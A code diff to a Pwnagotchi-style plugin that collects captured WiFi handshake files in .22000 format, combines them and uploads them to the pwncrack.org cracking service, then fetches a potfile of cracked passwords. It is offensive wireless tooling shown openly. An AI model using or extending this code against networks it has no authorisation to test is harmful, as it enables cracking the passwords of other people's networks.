@@ -10,7 +10,7 @@ class UploadConvertPlugin(Plugin):
     __author__ = 'Terminatoror'
     __version__ = '1.0.0'
     __license__ = 'GPL3'
-    __description__ = 'Converts .pcap files to .hc22000 and uploads them to pwncrack.org when internet is available.'
+    __description__ = 'Uploads .22000 handshake files to pwncrack.org when internet is available.'
 
     def __init__(self):
         self.server_url = 'http://pwncrack.org/upload_handshake'  # Leave this as is
@@ -44,28 +44,25 @@ class UploadConvertPlugin(Plugin):
             logging.error(f"[pwncrack] Error occurred during upload process: {e}", exc_info=True)
 
     def _convert_and_upload(self):
-        # Convert all .pcap files to .hc22000, excluding files matching whitelist items
-        pcap_files = [f for f in os.listdir(self.handshake_dir)
-                      if f.endswith('.pcap') and not any(item in f for item in self.whitelist)]
-        if pcap_files:
-            for pcap_file in pcap_files:
-                subprocess.run(['hcxpcapngtool', '-o', self.combined_file, os.path.join(self.handshake_dir, pcap_file)])
+        # Collect .22000 files written directly by wificapc, excluding whitelisted ones
+        hs_files = [f for f in os.listdir(self.handshake_dir)
+                    if f.endswith('.22000') and not any(item in f for item in self.whitelist)]
+        if hs_files:
+            # Combine all .22000 files (line-based text format — safe to concatenate)
+            with open(self.combined_file, 'w') as combined:
+                for hs_file in hs_files:
+                    with open(os.path.join(self.handshake_dir, hs_file), 'r') as f:
+                        combined.write(f.read())
 
-            # Ensure the combined file is created
-            if not os.path.exists(self.combined_file):
-                open(self.combined_file, 'w').close()
-
-            # Upload the combined .hc22000 file
             with open(self.combined_file, 'rb') as file:
                 files = {'handshake': file}
                 data = {'key': self.key}
                 response = requests.post(self.server_url, files=files, data=data)
 
-            # Log the response
             logging.info(f"[pwncrack] Upload response: {response.json()}")
-            os.remove(self.combined_file)  # Remove the combined.hc22000 file
+            os.remove(self.combined_file)
         else:
-            logging.info("[pwncrack] No .pcap files found to convert (or all files are whitelisted).")
+            logging.info("[pwncrack] No .22000 files found to upload (or all files are whitelisted).")
 
     def _download_potfile(self):
         response = requests.get(self.potfile_url, params={'key': self.key})
